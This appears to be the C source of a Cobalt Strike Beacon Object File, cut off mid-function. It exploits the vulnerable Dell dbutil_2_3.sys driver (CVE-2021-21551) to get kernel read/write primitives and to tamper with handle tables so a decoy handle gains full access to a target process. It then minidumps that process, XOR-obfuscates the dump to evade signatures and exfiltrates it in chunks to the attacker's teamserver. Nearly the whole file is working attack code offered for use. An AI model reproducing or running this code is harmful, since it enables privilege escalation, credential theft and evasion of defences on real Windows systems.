#include <windows.h>
#include <stdio.h>
#define CALLBACK_FILE       0x02	// Callback codes for Beacon download function
#define CALLBACK_FILE_WRITE 0x08
#define CALLBACK_FILE_CLOSE 0x09
#include <DbgHelp.h>					// Used for minidump function
#pragma comment(lib, "Dbghelp.lib")		//
#include "beacon.h"

// TODO: Improve bcnDownloadFile to support larger file downloads; currently fileless minidump downloads fail since they're too large
// NOTE: This exploit (CVE-2021-21551) IS on Microsoft's block list; however, systems may not implement the block list (IE Server 2012)

// 4 byte XOR key, allows for bruteforce decryption (MDMP Header). Change to anything if your dumps start getting signatured
SIZE_T bXorKeySize = 4;
BYTE bXorKey[] = { 'p','C','7','L',0 }; //CHANGEME

//////////////////////////////////////////////////////
// FUNCTION OFFSETS FOR DIFFERENT BUILDS OF WINDOWS //
// Identify offsets: https://www.vergiliusproject.com/ 
//////////////////////////////////////////////////////

typedef struct _KERNEL_OFFSETS {		//
	DWORD WindowsBuildVersion;			// Windows build number
	DWORD EprocessCurrentProcess;		// _EPROCESS -> UniqueProcessId
	DWORD EprocessNextProcOffset;		// _EPROCESS -> ActiveProcessLinks
	DWORD EprocHandleTableOffset;		// _EPROCESS -> _HANDLE_TABLE
	DWORD HndTableCodeOffset;			// _HANDLE_TABLE -> TableCode
	DWORD ObjHdrToBodyOffset;			// _OBJECT_HEADER -> Body
} KERNEL_OFFSETS;						//

// Define hardcoded offsets for various versions of windows
DWORD KERN_OFFSET_MEMBERS = 25; // Match to array size of kern_offsets[]
KERNEL_OFFSETS kern_offsets[25] = {
	// WindowsBuildVersion, EprocessCurrentProc, EprocessNextProc, EprocHandleTable, HndTableCode, ObjHdrToBody
	{3790, 0xd8, 0xe0, 0x158, 0x0, 0x30},		// WINDOWS XP    / Server 2003
	{6000, 0xe0, 0xe8, 0x160, 0x0, 0x30},		// WINDOWS VISTA / SERVER 2008 RTM
	{6001, 0xe0, 0xe8, 0x160, 0x0, 0x30},		// WINDOWS VISTA / SERVER 2008 SP1
	{6002, 0xe0, 0xe8, 0x160, 0x0, 0x30},		// WINDOWS VISTA / SERVER 2008 SP2
	{7600, 0x180, 0x188, 0x200, 0x0, 0x30},		// WINDOWS 7   / Server 2008 R2
	{7601, 0x180, 0x188, 0x200, 0x0, 0x30},		// WINDOWS 7   / Server 2008 SP1
	{9200, 0x2e0, 0x2e8, 0x408, 0x8, 0x30},		// WINDOWS 8   / Server 2012 RTM
	{9600, 0x2e0, 0x2e8, 0x408, 0x8, 0x30},		// WINDOWS 8.1 / Server 2012 R2
	{10240, 0x2e8, 0x2f0, 0x418, 0x8, 0x30},	// WINDOWS 10 1507
	{10586, 0x2e8, 0x2f0, 0x418, 0x8, 0x30},	// WINDOWS 10 1511
	{14393, 0x2e0, 0x2f0, 0x418, 0x8, 0x30},	// WINDOWS 10 1607 / Server 2016
	{15063, 0x2e0, 0x2e8, 0x418, 0x8, 0x30},	// WINDOWS 10 1703
	{16299, 0x2e0, 0x2e8, 0x418, 0x8, 0x30},	// WINDOWS 10 1709
	{17134, 0x2e0, 0x2e8, 0x418, 0x8, 0x30},	// WINDOWS 10 1803
	{17763, 0x2e0, 0x2e8, 0x418, 0x8, 0x30},	// WINDOWS 10 1809 / Server 2019
	{18362, 0x2e8, 0x2f0, 0x418, 0x8, 0x30},	// WINDOWS 10 1903 + WINDOWS 10 1909
	{19041, 0x440, 0x448, 0x570, 0x8, 0x30},	// WINDOWS 10 2004
	{19042, 0x440, 0x448, 0x570, 0x8, 0x30},	// WINDOWS 10 20H2
	{19043, 0x440, 0x448, 0x570, 0x8, 0x30},	// WINDOWS 10 21H1
	{19044, 0x440, 0x448, 0x570, 0x8, 0x30},	// WINDOWS 10 21H2
	{19045, 0x440, 0x448, 0x570, 0x8, 0x30},	// WINDOWS 10 22H2
	{22000, 0x440, 0x448, 0x570, 0x8, 0x30},	// WINDOWS 11 21H2
	{22621, 0x440, 0x448, 0x570, 0x8, 0x30},	// WINDOWS 11 22H2
	{22631, 0x440, 0x448, 0x570, 0x8, 0x30},	// WINDOWS 11 23H2
	{26100, 0x1d0, 0x1d8, 0x300, 0x8, 0x30},	// WINDOWS 11 24H2
}; // Global offset variable placeholders (placeholders match most Windows 10 builds)
DWORD EPROCESS_CURRENT_PROCESS = 0x440;
DWORD EPROCESS_NEXT_PROCESS = 0x448;
DWORD EPROC_HANDLE_TABLE = 0x570;
DWORD HND_TABLE_CODE = 0x8;
DWORD OBJ_HDR_TO_BODY = 0x30;


///////////////////////////////////////////////////
// GLOBAL CONSTANTS/ENUMS FOR MAIN FUNCTIONALITY //
DWORD curProcId = 0;
DWORDLONG INITIAL_BUFFER_SIZE = (1024 * 1024 * 64ull);

// REQUIRED FUNCTIONS/STRUCTS FOR MAIN FUNCTIONALITY
typedef struct _SYSTEM_HANDLE
{
	PVOID Object;
	HANDLE UniqueProcessId;
	HANDLE HandleValue;
	ULONG GrantedAccess;
	USHORT CreatorBackTraceIndex;
	USHORT ObjectTypeIndex;
	ULONG HandleAttributes;
	ULONG Reserved;
} SYSTEM_HANDLE, * PSYSTEM_HANDLE;
typedef struct _SYSTEM_HANDLE_INFORMATION_EX
{
	ULONG_PTR HandleCount;
	ULONG_PTR Reserved;
	SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, * PSYSTEM_HANDLE_INFORMATION_EX;
typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemExtendedHandleInformation = 64
} SYSTEM_INFORMATION_CLASS;
typedef NTSTATUS(WINAPI* _NtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass,__inout PVOID SystemInformation,ULONG SystemInformationLength,__out_opt PULONG ReturnLength);
typedef VOID(__fastcall* _RtlGetNtVersionNumbers)(DWORD* MajorVersion,DWORD* MinorVersion,DWORD* BuildNumber); // Function definition to resolve Windows build number
typedef BOOL(WINAPI* MINIDUMP_CALLBACK_ROUTINE) (_Inout_ PVOID CallbackParam, _In_ PMINIDUMP_CALLBACK_INPUT CallbackInput, _Inout_ PMINIDUMP_CALLBACK_OUTPUT CallbackOutput);
typedef struct _MINIDUMP_CALLBACK_PARM
{
	LPVOID		    pDumpedBuffer;				// Buffer where dump data is written
	DWORDLONG		dwDumpedBufferSize;			// Number of bytes actually written into the buffer.
	DWORDLONG		dwAllocatedBufferSize;		// Current size of the allocated buffer

} MINIDUMP_CALLBACK_PARM, * PMINIDUMP_CALLBACK_PARM;
typedef BOOL(WINAPI* _MiniDumpWriteDump)(HANDLE hProcess,DWORD ProcessId, HANDLE hFile, MINIDUMP_TYPE DumpType, PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam, PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam, PMINIDUMP_CALLBACK_INFORMATION CallbackParam);

// GLOBAL CONSTANTS FOR EXPLOIT
DWORD IOCTL_WRITE_CODE = 0x9B0C1EC8;	// Write primitive IOCTL
DWORD IOCTL_READ_CODE  = 0x9B0C1EC4;	// Read primitive IOCTL
HANDLE hDellDriver = NULL;

// REQUIRED STRUCTS FOR EXPLOIT
//N/A for Dell dbutil_2_3.sys exploit
/////////////////////////////////////////////////////



///////////////////////////
//// UTILITY FUNCTIONS ////
///////////////////////////

// Write minidump file to disk 
BOOL WriteFileToDiskA(LPCSTR cFileName, PBYTE pFileBuffer, OUT DWORD dwFileSize) {
	DECLSPEC_IMPORT HANDLE KERNEL32$CreateFileA(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
	DECLSPEC_IMPORT BOOL KERNEL32$WriteFile(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED);
	DECLSPEC_IMPORT BOOL KERNEL32$CloseHandle(HANDLE);

	HANDLE		hFile = INVALID_HANDLE_VALUE;
	DWORD		dwNumberOfBytesWritten = 0x00;

	if (!cFileName || !pFileBuffer || !dwFileSize)
		goto _END_OF_FUNC;

	if ((hFile = KERNEL32$CreateFileA(cFileName, GENERIC_READ | GENERIC_WRITE, 0x00, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		goto _END_OF_FUNC;
	}

	if (!KERNEL32$WriteFile(hFile, pFileBuffer, dwFileSize, &dwNumberOfBytesWritten, NULL) || dwFileSize != dwNumberOfBytesWritten) {
		goto _END_OF_FUNC;
	}

_END_OF_FUNC:
	if (hFile != INVALID_HANDLE_VALUE)
		KERNEL32$CloseHandle(hFile);
	return (dwNumberOfBytesWritten == dwFileSize) ? TRUE : FALSE;
}

// TODO: Improve this function to handle larger file downloads through beacon
// Download the minidump filelessly through beacon (Reference: https://github.com/fortra/nanodump/blob/450d5b23aeba5e0f8f6e5fc826a08997b2237be9/source/utils.c)
BOOL bcnDownloadFile(LPCSTR fileName, char fileData[], ULONG32 fileLength) {
    
	// Max # of bytes to send with each callback when downloading the file
	DWORD chunk_size = (1024 * 900);	// 900 KiB per chunk
	
	DECLSPEC_IMPORT HANDLE KERNEL32$GetProcessHeap();
    DECLSPEC_IMPORT LPVOID KERNEL32$HeapAlloc(HANDLE,DWORD,SIZE_T);
    DECLSPEC_IMPORT BOOL KERNEL32$HeapFree(HANDLE,DWORD,LPVOID);
    DECLSPEC_IMPORT int MSVCRT$rand(void);
    DECLSPEC_IMPORT void MSVCRT$srand(int);
    DECLSPEC_IMPORT time_t MSVCRT$time(time_t*);

	// Get length of filename (max 256 chars)
	int fileNameLength = 0;
	while (fileName[fileNameLength] != '\0' && fileNameLength < 256) {
		fileNameLength++;
	}

	// Initialize random number generator
    time_t t;
    MSVCRT$srand((unsigned) MSVCRT$time(&t));

    // Generate random 4 byte id, rand max value is 0x7fff
    ULONG32 fileId = 0;
    fileId |= ((MSVCRT$rand()) & 0x7FFF) << 0x11;
    fileId |= ((MSVCRT$rand()) & 0x7FFF) << 0x02;
    fileId |= ((MSVCRT$rand()) & 0x0003) << 0x00;

    // 8 bytes for fileId and fileLength
    ULONG32 messageLength = 8 + fileNameLength;
    char* packedData = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, messageLength);
    if (!packedData) {
        BeaconPrintf(CALLBACK_ERROR,"Failed to download the minidump");
        return FALSE;
    }

    // Pack on fileId as 4-byte int first
    packedData[0] = (fileId >> 0x18) & 0xFF;
    packedData[1] = (fileId >> 0x10) & 0xFF;
    packedData[2] = (fileId >> 0x08) & 0xFF;
    packedData[3] = (fileId >> 0x00) & 0xFF;

    // Pack on fileLength as 4-byte int second
    packedData[4] = (fileLength >> 0x18) & 0xFF;
    packedData[5] = (fileLength >> 0x10) & 0xFF;
    packedData[6] = (fileLength >> 0x08) & 0xFF;
    packedData[7] = (fileLength >> 0x00) & 0xFF;

    // Pack on the file name last
    for (int i = 0; i < fileNameLength; i++) {
        packedData[8 + i] = fileName[i];
    }

    // Tell the teamserver that we want to download a file
    BeaconOutput(CALLBACK_FILE, packedData, messageLength);
	if (packedData) {
		//memset(packedData, 0, messageLength);
    	__stosb((PBYTE)packedData, 0, messageLength);
		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, packedData);
		packedData = NULL;
	}

    // Use same memory region for all chuncks
    ULONG32 chunkLength = 4 + chunk_size;
    char* packedChunk = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, chunkLength);
    if (!packedChunk) {
        BeaconPrintf(CALLBACK_ERROR,"Failed to download the minidump");
        return FALSE;
    }
    // The fileId is the same for all chunks
    packedChunk[0] = (fileId >> 0x18) & 0xFF;
    packedChunk[1] = (fileId >> 0x10) & 0xFF;
    packedChunk[2] = (fileId >> 0x08) & 0xFF;
    packedChunk[3] = (fileId >> 0x00) & 0xFF;

    ULONG32 exfiltrated = 0;
    while (exfiltrated < fileLength) {
        // Send the file content by chunks
        chunkLength = fileLength - exfiltrated > chunk_size ? chunk_size : fileLength - exfiltrated;
        ULONG32 chunkIndex = 4;
        for (ULONG32 i = exfiltrated; i < exfiltrated + chunkLength; i++) {
            packedChunk[chunkIndex++] = fileData[i];
        }
        // Send a chunk
        BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, 4 + chunkLength);
        exfiltrated += chunkLength;
    }
	if (packedChunk) {
		//memset(packedChunk, 0, chunkLength);
    	__stosb((PBYTE)packedChunk, 0, chunkLength);
		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, packedChunk);
		packedChunk = NULL;
	}

    // Tell the teamserver that we are done writing to this fileId
    char packedClose[4];
    packedClose[0] = (fileId >> 0x18) & 0xFF;
    packedClose[1] = (fileId >> 0x10) & 0xFF;
    packedClose[2] = (fileId >> 0x08) & 0xFF;
    packedClose[3] = (fileId >> 0x00) & 0xFF;
    BeaconOutput(CALLBACK_FILE_CLOSE, packedClose, 4);
    BeaconPrintf(CALLBACK_OUTPUT,"[+] Fileless minidump download completed");

    return TRUE;
}

// Resolve Windows OS version
DWORD GetWinBuildNo(void) {
	DECLSPEC_IMPORT HMODULE KERNEL32$GetModuleHandleA(LPCSTR);
	DECLSPEC_IMPORT FARPROC KERNEL32$GetProcAddress(HMODULE,LPCSTR);

	char ntdllStr[]      = { 'n','t','d','l','l','.','d','l','l',0 };
	char getVersionStr[] = { 'R','t','l','G','e','t','N','t','V','e','r','s','i','o','n','N','u','m','b','e','r','s',0 };

	// https://www.geoffchappell.com/studies/windows/win32/ntdll/api/ldrinit/getntversionnumbers.htm
	_RtlGetNtVersionNumbers pRtlGetNtVersionNumbers = (_RtlGetNtVersionNumbers)(KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA(ntdllStr), getVersionStr));

	DWORD major = 0, minor = 0, buildno = 0;
	if (pRtlGetNtVersionNumbers) {
		pRtlGetNtVersionNumbers(&major, &minor, &buildno);
		BeaconPrintf(CALLBACK_OUTPUT,"[+] Retrieved Windows version: %d.%d Build:%d", major, minor, buildno & 0xffff);
		return buildno & 0xffff;
	}
	else
		return 0;
}

// Identify the system's Windows OS version. Returns false if unable to identify it
BOOL resolveVersionOffsets() {
	DWORD buildno = GetWinBuildNo();
	BOOL exactVersionFound = FALSE;

	// Immediately return if invalid build # supplied
	if (buildno == 0) {
		return FALSE;
	}

	// Check if current windows build version is found in array
	for (int i = 0; i < KERN_OFFSET_MEMBERS; i++) {
		// Check if exact version found
		if (kern_offsets[i].WindowsBuildVersion == buildno) {
			BeaconPrintf(CALLBACK_OUTPUT,"[+] Exact match found for Windows build");
			exactVersionFound = TRUE;
		}
		// Set offsets once at end of array (most recent build #) OR if array build # exceeds the current system's build #
		if (i == (KERN_OFFSET_MEMBERS - 1) || kern_offsets[i].WindowsBuildVersion >= buildno) {
			// Set offsets for last iteration's build number if current one exceeds this system's build #
			if (kern_offsets[i].WindowsBuildVersion > buildno && i >= 1) { i = i - 1; }

			BeaconPrintf(CALLBACK_OUTPUT,"[*] Will set offsets for Windows build: %d", kern_offsets[i].WindowsBuildVersion);
			EPROCESS_CURRENT_PROCESS = kern_offsets[i].EprocessCurrentProcess;
			EPROCESS_NEXT_PROCESS = kern_offsets[i].EprocessNextProcOffset;
			EPROC_HANDLE_TABLE = kern_offsets[i].EprocHandleTableOffset;
			HND_TABLE_CODE = kern_offsets[i].HndTableCodeOffset;
			OBJ_HDR_TO_BODY = kern_offsets[i].ObjHdrToBodyOffset;

			// Break loop after setting offsets
			i = KERN_OFFSET_MEMBERS;
			break;
		}
	}

	// Return false if current windows version was NOT in kernel offsets array
	return exactVersionFound;
}

// Leak kernel-mode address of handle associated with given PID
LPVOID leakKernHandle(DWORD pid, HANDLE hLeak) {
	DECLSPEC_IMPORT HMODULE KERNEL32$GetModuleHandleA(LPCSTR);
	DECLSPEC_IMPORT FARPROC KERNEL32$GetProcAddress(HMODULE,LPCSTR);
	DECLSPEC_IMPORT HGLOBAL KERNEL32$GlobalAlloc(UINT,SIZE_T);
	DECLSPEC_IMPORT BOOL KERNEL32$CloseHandle(HANDLE);
	DECLSPEC_IMPORT HGLOBAL KERNEL32$GlobalFree(HGLOBAL);

	char ntdllStr[]   = { 'n','t','d','l','l','.','d','l','l',0 };
	char ntQueryStr[] = { 'N','t','Q','u','e','r','y','S','y','s','t','e','m','I','n','f','o','r','m','a','t','i','o','n',0 };

	LPVOID leakAddr = NULL;

	// Resolve NtQuerySystemInformation API
	HMODULE ntdll = KERNEL32$GetModuleHandleA(ntdllStr);
	_NtQuerySystemInformation query = (_NtQuerySystemInformation)KERNEL32$GetProcAddress(ntdll, ntQueryStr);
	if (query == NULL) {
		return leakAddr;
	}

	// Execute NtQuerySystemInformation until there is no more data to return (0xc0000004)
	ULONG len = 20;
	NTSTATUS status = (NTSTATUS)0xc0000004;
	PSYSTEM_HANDLE_INFORMATION_EX pHandleInfo = NULL;
	do {
		len *= 2;
		pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)KERNEL32$GlobalAlloc(GMEM_ZEROINIT, len);
		status = query(SystemExtendedHandleInformation, pHandleInfo, len, &len);
	} while (status == (NTSTATUS)0xc0000004);
	if (status != (NTSTATUS)0x0) {
		goto _END_OF_FUNC;
	}

	// Iterate through returned handles to find kernel mode address for the associated object
	for (int i = 0; i < pHandleInfo->HandleCount; i++) {
		if (pid == (DWORD)(pHandleInfo->Handles[i].UniqueProcessId) &&
			hLeak == pHandleInfo->Handles[i].HandleValue)
		{
			leakAddr = pHandleInfo->Handles[i].Object;
			goto _END_OF_FUNC;
		}
	}

_END_OF_FUNC:
	if (hLeak) { KERNEL32$CloseHandle(hLeak); }
	if (pHandleInfo) { KERNEL32$GlobalFree(pHandleInfo); }
	return leakAddr;
}



////////////////////////////////////////////
//// EXPLOIT CODE AND CLEANUP FUNCTIONS ////
////////////////////////////////////////////

// Open handle to driver
HANDLE GetVulnDriverHnd() {
	DECLSPEC_IMPORT HANDLE KERNEL32$CreateFileA(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);

	char dbutilName[] = { '\\', '\\', '.', '\\', 'D', 'B', 'U', 't', 'i', 'l', '_', '2', '_', '3',0 };

	// Obtain a handle to the vulnerable driver //
	HANDLE driverHandle = KERNEL32$CreateFileA(
		dbutilName,
		FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE,
		0x0,
		NULL,
		OPEN_EXISTING,
		0x0,
		NULL
	);
	if (driverHandle == INVALID_HANDLE_VALUE)
	{
		BeaconPrintf(CALLBACK_ERROR,"Unable to obtain a handle %d to the %s driver. Is it loaded?", driverHandle, dbutilName);
		return NULL;
	}
	return driverHandle;
}

// Read primitive
ULONGLONG readqword(HANDLE hDriver, ULONGLONG where) {
	DECLSPEC_IMPORT BOOL KERNEL32$DeviceIoControl(HANDLE,DWORD,LPVOID,DWORD,LPVOID,DWORD,LPDWORD,LPOVERLAPPED);

	// Buffer to send to the driver (read primitive)
	unsigned long long inBuf1[4];

	// Values to send
	unsigned long long one1 = 0x4141414141414141;
	unsigned long long two1 = where;
	unsigned long long three1 = 0x0000000000000000;
	unsigned long long four1 = 0x0000000000000000;

	// Assign the values
	inBuf1[0] = one1;
	inBuf1[1] = two1;
	inBuf1[2] = three1;
	inBuf1[3] = four1;

	// Interact with the driver
	DWORD bytesReturned1 = 0;

	BOOL interact = KERNEL32$DeviceIoControl(
		hDriver, IOCTL_READ_CODE,
		&inBuf1, sizeof(inBuf1),
		&inBuf1, sizeof(inBuf1),
		&bytesReturned1, NULL
	);

	// Error handling
	if (!interact) {
		return NULL;
	}

	// Last member of array contains leaked bytes
	unsigned long long kernel_read = inBuf1[3];
	return kernel_read;
}

// Write primitive
void writeqword(HANDLE hDriver, ULONGLONG where, ULONGLONG what) {
	DECLSPEC_IMPORT BOOL KERNEL32$DeviceIoControl(HANDLE,DWORD,LPVOID,DWORD,LPVOID,DWORD,LPDWORD,LPOVERLAPPED);

	// Clear the no-eXecute bit in the actual PTE
	// Buffer to send to the driver (write primitive)
	unsigned long long inBuf13[4];

	// Values to send
	unsigned long long one13 = 0x4141414141414141;
	unsigned long long two13 = where;
	unsigned long long three13 = 0x0000000000000000;
	unsigned long long four13 = what;

	// Assign the values
	inBuf13[0] = one13;
	inBuf13[1] = two13;
	inBuf13[2] = three13;
	inBuf13[3] = four13;


	// Interact with the driver
	DWORD bytesReturned13 = 0;

	BOOL interact12 = KERNEL32$DeviceIoControl(
		hDriver,
		IOCTL_WRITE_CODE,
		&inBuf13,
		sizeof(inBuf13),
		&inBuf13,
		sizeof(inBuf13),
		&bytesReturned13,
		NULL
	);
}



/////////////////////////////////////////////////////////////////////////
//// HANDLE MANIPULATION FUNCTIONS (OPEN SACRIFICIAL PROCESS HANDLE) ////
/////////////////////////////////////////////////////////////////////////

// Global variables for handle kernel address and its contents
ULONGLONG handleKernelAddr = 0;
ULONGLONG handleContents = 0;

// Open handle and check that it exists in kernel handle table (create new handle if not)
HANDLE OpenHandle(DWORD tpid, DWORD processPrivMask) {
    DECLSPEC_IMPORT HANDLE KERNEL32$OpenProcess(DWORD,BOOL,DWORD);

	// Handle array since it may take multiple tries to get object in handle table, max 50 tries
	HANDLE outHnd[50] = { 0 };
	HANDLE outHndFinal = NULL;
	SIZE_T hndArrSize = 50;
	ULONGLONG entries[50] = { 0 };

	ULONGLONG entryObjValue = 0;
	ULONGLONG outHndOffset = 0;
	ULONGLONG hndSubTableOffset = 0;
	ULONGLONG hndSubTable = 0;

	// Leak current process address from self-reference handle
	HANDLE curProcessHnd = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, curProcId);
	ULONGLONG curEprocess = leakKernHandle(curProcId, curProcessHnd);

	// Leak target process addr (and open handle to it) -- return early if it fails to open
	outHnd[0] = KERNEL32$OpenProcess(processPrivMask, FALSE, tpid);
	if (outHnd[0] == INVALID_HANDLE_VALUE || outHnd[0] == NULL) {
		return NULL;
	}
	ULONGLONG targetEprocess = leakKernHandle(curProcId, outHnd[0]);

	// Get address of _HANDLE_TABLE structure
	ULONGLONG hndTable = readqword(hDellDriver, (curEprocess + EPROC_HANDLE_TABLE));
	BeaconPrintf(CALLBACK_OUTPUT,"[+] Handle table for process %llx at %llx", curEprocess, hndTable);

	// Get actual address to handle table
	hndTable = readqword(hDellDriver, (hndTable + HND_TABLE_CODE));
	BeaconPrintf(CALLBACK_OUTPUT,"[*] Dereferenced _HANDLE_TABLE to TableCode, address: %llx", hndTable);

	// Check if enough handles are open in the process t o require handle subtables
	BOOL multipleHndTables = FALSE;
	if ((hndTable & 0xF) != 0) {
		multipleHndTables = TRUE;
		BeaconPrintf(CALLBACK_OUTPUT, "[*] Multiple tables detected, will look at subtables");
	}
	// Zero out last byte of handle table pointer
	ULONGLONG maskHndTbl = 0xfffffffffffffff0;
	hndTable = (hndTable & maskHndTbl);

	// Try up to multiple times to get real handle to process (sometimes initial handle will not appear yet)
	int i = 0;
	while (i < hndArrSize && handleKernelAddr == NULL) {
		// Open new handle unlesss this is the first iteration
		if (i != 0) { outHnd[i] = KERNEL32$OpenProcess(processPrivMask, FALSE, tpid); }

		// Search for all opened handles in handle table
		for (int j = 0; j < i; j++) {
			// If subtables exist, find handle's corresponding subtable and read from offset into it
			if (multipleHndTables) {
				hndSubTableOffset = (((((ULONGLONG)outHnd[j]) & 0xff00) >> 8) / 0x4) * 0x8;
				hndSubTable = readqword(hDellDriver, (hndTable + hndSubTableOffset));
				outHndOffset = ((((ULONGLONG)outHnd[j]) & 0xff) / 0x4) * 0x10;
				entries[j] = readqword(hDellDriver, (hndSubTable + outHndOffset));
				//BeaconPrintf(CALLBACK_OUTPUT, "[*] Checking handle %lx at subtable %llx", outHnd[j], (hndTable + outHndOffset)); //DEBUG
			}
			// Convert handle value to offset in handle table, then read that handle entry
			else {
				outHndOffset = (((ULONGLONG)outHnd[j]) / 0x4) * 0x10;
				entries[j] = readqword(hDellDriver, (hndTable, outHndOffset));
				//BeaconPrintf(CALLBACK_OUTPUT, "[*] Checking handle %lx at %llx", outHnd[j], (hndTable + outHndOffset)); //DEBUG
			}
			// Convert handle entry value to a pointer for its corresponding object
			entryObjValue = ((((entries[j] >> 0x14) << 4) | 0xffff000000000000) + OBJ_HDR_TO_BODY);
			//BeaconPrintf(CALLBACK_OUTPUT, "[*] Decoded object value from handle: %llx", entryObjValue); //DEBUG

			// Once a handle's object is equal to target EPROCESS, must be correct one
			if (entryObjValue == targetEprocess) {
				if (multipleHndTables) {
					handleKernelAddr = (hndSubTable + outHndOffset);
				}
				else {
					handleKernelAddr = (hndTable + outHndOffset);
				}
				handleContents = entries[j];
				outHndFinal = outHnd[j];
				BeaconPrintf(CALLBACK_OUTPUT, "[+] Correct object %llx found at entry %llx | (Handle 0x%x)", entryObjValue, handleKernelAddr, (DWORD)outHndFinal);
			}
		}
		i++;
	}
	return outHndFinal;
}

// Tamper decoy handle so it points to target process
ULONGLONG TamperHandleDecoy(DWORD decoyPid, DWORD targetPid, ULONGLONG decoyProcAddr, ULONGLONG decoyAddrContents) {
	
	// Check that a valid kernel address to the handle is supplied
	ULONGLONG kAddrMask = 0xffff000000000000;
	if ((decoyProcAddr & kAddrMask) != kAddrMask) {
		return FALSE;
	}
	// Save original handle address contents to restore later
	ULONGLONG origDecoyAddrContents = decoyAddrContents;

	// Decode current handle's corresponding EPROCESS address (will use to traverse links in EPROCESS structure)
	ULONGLONG decoyEprocess = ((((decoyAddrContents >> 0x14) << 4) | 0xffff000000000000) + OBJ_HDR_TO_BODY);

	// Initialize EPROCESS iterator variable 
	ULONGLONG iterProc = (readqword(hDellDriver, (decoyEprocess + EPROCESS_NEXT_PROCESS))) - EPROCESS_NEXT_PROCESS;;

	// Parse process list with read primitive to find target PID address
	ULONGLONG targetEprocess = 0;
	DWORD iterPid = 0;
	BOOL hitLoop = FALSE;
	
	// Look for target EPROCESS object (try until EPROCESS linked list loops back to the decoy PID)
	while ((hitLoop < 2) && (targetEprocess == 0)) {
		// Check if current EPROCESS PID is the target
		if (iterPid == targetPid) {
			targetEprocess = iterProc;
		}
		// Otherwise go to next EPROCESS and retrieve its PID
		else {
			iterProc = (readqword(hDellDriver, (iterProc + EPROCESS_NEXT_PROCESS))) - EPROCESS_NEXT_PROCESS;
			iterPid = (readqword(hDellDriver, (iterProc + EPROCESS_CURRENT_PROCESS)) & 0xffffffff);
		}
		// Check if linked list has been completely looped through 
		if (iterPid == decoyPid) {
			hitLoop++; // Wait for this to hit 2 in case decoy and target processes point to same EPROCESS structure
			// (Since we use the 'leakKernHandle' function, meaning we may get the decoy process as initial EPROCESS and end the search early)
		}
	}
	if (targetEprocess == 0) {
		BeaconPrintf(CALLBACK_ERROR,"Could not find target process in kernel");
		return FALSE;
	}
	
	// Change handle object pointer from decoy EPROCESS to target EPROCESS	
	targetEprocess = (targetEprocess - OBJ_HDR_TO_BODY) << 0x10;
	decoyAddrContents = (decoyAddrContents & 0xfffff) | targetEprocess;
	writeqword(hDellDriver, decoyProcAddr, decoyAddrContents);

	// Check if overwrite succeeded
	if (readqword(hDellDriver, decoyProcAddr) == decoyAddrContents) {
		BeaconPrintf(CALLBACK_OUTPUT,"[+] Overwrote handle, now points to target EPROCESS");
		return origDecoyAddrContents;
	}
	return FALSE;
}

// Tamper with the handle object in kernel mode to increase its privileges
BOOL elevateHandle(ULONGLONG lowPrivHndAddr) {
	
	// Check that a valid kernel address to the handle is supplied
	ULONGLONG kAddrMask = 0xffff000000000000;
	if ((lowPrivHndAddr & kAddrMask) != kAddrMask) {
		return FALSE;
	}
	DWORD handleFullPrivilege = 0x1fffff;  // Full handle privilege mask 

	// Read current QWORD for handle privileges, set lower 32 bits to new privilege mask
	ULONGLONG hndPrivs = readqword(hDellDriver, (lowPrivHndAddr + 0x8));
	hndPrivs = ((hndPrivs & 0xffffffff00000000) | handleFullPrivilege);

	// Set handle privilege to full access
	writeqword(hDellDriver, (lowPrivHndAddr + 0x8), hndPrivs);

	// Check if write operation succeeded
	if (readqword(hDellDriver, (lowPrivHndAddr + 0x8)) == hndPrivs) {
		BeaconPrintf(CALLBACK_OUTPUT,"[+] Set handle privileges at address %llx", (lowPrivHndAddr + 0x8));
		return TRUE;
	}
	return FALSE;
}



///////////////////////////////////////////////////
//// PROCESS MANIPULATION FUNCTIONS (MINIDUMP) ////
///////////////////////////////////////////////////

// Callback routine to process memory dump
BOOL MinidumpCallbackRoutine(PVOID CallbackParam, PMINIDUMP_CALLBACK_INPUT CallbackInput, PMINIDUMP_CALLBACK_OUTPUT CallbackOutput) {
	DECLSPEC_IMPORT HANDLE KERNEL32$GetProcessHeap();
	DECLSPEC_IMPORT LPVOID KERNEL32$HeapReAlloc(HANDLE,DWORD,LPVOID,SIZE_T);
	DECLSPEC_IMPORT void NTDLL$RtlCopyMemory(void*,const void*,size_t);

	PMINIDUMP_CALLBACK_PARM		pMiniDumpParm = (PMINIDUMP_CALLBACK_PARM)CallbackParam;

	switch (CallbackInput->CallbackType) {
		case IoStartCallback:
		{
			CallbackOutput->Status = S_FALSE;
			break;
		}
		case IoWriteAllCallback:
		{
			DWORDLONG	dwOffset = CallbackInput->Io.Offset;
			DWORDLONG	dwBufferBytes = CallbackInput->Io.BufferBytes;
			DWORDLONG	dwRequired = dwOffset + dwBufferBytes;
			LPVOID		pDestination = NULL;

			if (dwRequired > pMiniDumpParm->dwAllocatedBufferSize) {
				DWORDLONG	dwNewBufferSize = max(dwRequired, pMiniDumpParm->dwAllocatedBufferSize * 2);
				LPVOID		pNewBuffer = KERNEL32$HeapReAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, pMiniDumpParm->pDumpedBuffer, dwNewBufferSize);

				if (!pNewBuffer) {
					CallbackOutput->Status = E_OUTOFMEMORY;
					return FALSE;
				}
